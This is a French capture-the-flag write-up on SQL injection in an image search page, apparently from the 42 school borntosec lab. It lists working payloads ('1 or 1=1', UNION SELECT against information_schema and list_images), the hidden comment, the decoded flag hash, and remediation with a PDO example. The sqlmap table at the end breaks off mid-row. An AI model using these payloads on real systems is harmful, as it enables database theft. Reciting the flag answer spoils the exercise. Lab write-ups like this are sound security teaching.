## **SQL Injection - Page Images**

### **Description**
La page de recherche d’images (`searchimg`) est vulnérable à une **injection SQL**.
**Problème :** Les données fournies par l’utilisateur ne sont pas filtrées correctement, ce qui permet d’injecter des instructions SQL malveillantes dans la requête.

### **Exploitation**
- En injectant `1 or 1=1`, un attaquant peut contourner la clause `WHERE` et afficher **toutes les images**.
- Utilisation de l’instruction `UNION` pour extraire d'autres colonnes depuis une autre table :
```sql
id=1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
- Cela révèle une table nommée **list_images**, avec une colonne intéressante : **comment**

- Requête finale pour exfiltrer des données :
```sql
id=1 or 1=1 UNION SELECT url, comment FROM list_images
```
- Cette requête retourne une **consigne cachée** dans la colonne `comment` :
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```
- Décodage :
  - `1928e8083cf461a51303633093573c46` (MD5 → plain text) → **albatroz**
  - `albatroz` (minuscule) → SHA256 = **f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**

### **Exemples d’exploitation**
- **Exfiltration de données** : Extraction de tous les liens d'images et des commentaires cachés.
- **Lecture d’instructions sensibles** dissimulées dans la base de données.

### **Cas d’usage**
- Obtenir un dump de la base `Member_images`.
- Identifier les colonnes cachées, les commentaires ou données sensibles.

### **Recommandations**
- **Utiliser des requêtes préparées** (par exemple avec `PDO::prepare`).
- **Éviter les concaténations directes de données utilisateur** dans les requêtes SQL.
- **Limiter les droits du compte SQL utilisé par l’application.**
- **Filtrer et valider toutes les entrées utilisateur.**

### **Exemple de code sécurisé (PHP + PDO)**

```php
\$pdo = new PDO('mysql:host=localhost;dbname=Member_images', 'user', 'pass');
\$stmt = \$pdo->prepare("SELECT id, title, url FROM images WHERE id = :id");
\$stmt->execute(['id' => \$_GET['id']]);
\$result = \$stmt->fetchAll();
```

### **Extrait de données (via sqlmap)**

| id | url                              | title     | comment                                                                                                               |
|----|----------------------------------|-----------|-----------------------------------------------------------------------------------------------------------------------|
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to
